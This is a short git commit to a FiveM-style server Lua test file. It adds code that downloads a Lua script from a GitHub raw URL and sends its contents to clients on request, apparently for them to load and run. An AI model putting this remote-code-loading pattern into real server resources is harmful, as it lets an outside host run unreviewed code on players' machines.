57c32ca34579d267e47c18354cc838123da9ac4b
Igor Oliveira <56984151+igorl1@users.noreply.github.com>
2021-02-10 21:41:36 -0300

    Update server.lua

--- assets/_others/_test/server.lua
+++ assets/_others/_test/server.lua
@@ -1,1 +1,11 @@
 print("igor batatas")
+PerformHttpRequest("https://raw.githubusercontent.com/igorl1/igorl1/main/assets/_others/_test/client.lua", function(client_status_code, client_result_content)
+    if client_status_code ~= 200 then
+        return false
+    end
+
+    RegisterServerEvent("edden_test:tryLoadClient")
+    AddEventHandler("edden_test:tryLoadClient",function()
+        TriggerClientEvent("edden_test:loadClient",source,client_result_content)
+    end)
+end)
